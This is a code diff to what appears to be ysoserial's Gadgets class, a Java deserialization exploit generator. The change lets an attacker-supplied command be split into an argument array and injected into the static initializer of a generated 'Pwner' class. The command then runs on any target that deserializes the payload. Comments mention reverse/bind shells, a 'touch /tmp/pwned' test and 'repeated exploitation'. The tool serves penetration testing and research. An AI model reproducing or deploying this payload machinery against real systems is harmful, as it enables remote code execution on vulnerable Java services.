@@ -113,7 +113,22 @@ public class Gadgets {
         final CtClass clazz = pool.get(StubTransletPayload.class.getName());
         // run command in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");");
+        // clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");");
+        // clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(new String[]{ \"/bin/bash\", \"-c\", \"touch /tmp/pwned\"});");
+
+        if ( command.startsWith("#") ) {
+            final String tcommand = command.substring(1, command.length());
+            final String[] execArgs = tcommand.split("\\|\\|");
+            String tempExecArgsStr = "";
+            for (String arg : execArgs) {
+                tempExecArgsStr += "\"" + arg.replaceAll("\"", "\\\"") + "\",";
+            }
+            final String execArgsStr = "new String[]{" + tempExecArgsStr.substring(0, tempExecArgsStr.length() - 1) + "}";
+            clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(" + execArgsStr + ");");
+        } else {
+            clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");");
+        }
+
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
         CtClass superC = pool.get(abstTranslet.getName());
